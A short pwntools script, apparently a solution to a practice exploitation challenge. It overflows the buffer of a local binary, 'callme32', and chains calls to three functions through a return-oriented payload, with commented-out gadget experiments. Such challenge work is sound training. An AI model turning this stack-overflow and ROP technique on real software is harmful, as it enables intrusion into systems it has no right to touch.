from pwn import *

context(arch='i386', os='linux')
binary_name = 'callme32'
p = process('./'+binary_name)

elf = ELF(binary_name)
rop = ROP(elf)

callme_one =   elf.sym["callme_one"]
callme_two =   elf.sym["callme_two"]
callme_three = elf.sym["callme_three"]
log.info("callme_one:   "+  hex(callme_one))
log.info("callme_two:   "+  hex(callme_two))
log.info("callme_three: "+hex(callme_three))

leave    = 0x080486a8
xor_edi  = 0x08048880
inc_edi  = 0x08048174 
push_edi = 0x08048851
push_2   = 0x08048753
push_1   = 0x08048848

# 0x08048a3a : inc ecx ; ret

junk = "A"*44
rop =  junk
# test = p32(xor_edi) + p32(inc_edi) + p32(inc_edi) + p32(inc_edi) + p32(push_edi) + p32(push_2) + p32(push_1)
# test = p32(push_1) + p32(push_2) + p32(xor_edi) + p32(inc_edi) + p32(inc_edi) + p32(inc_edi) + p32(push_edi)
#test = p32(1) + p32(2) + p32(3) + p32(leave)
test = p32(3) + p32(2) + p32(1) #+ p32(leave)
rop += test
rop += p32(callme_one)
rop += test
rop += p32(callme_two)
rop += test
rop += p32(callme_three)
#rop += p32(leave)
p.recvuntil("> ")
p.send(rop)
p.interactive()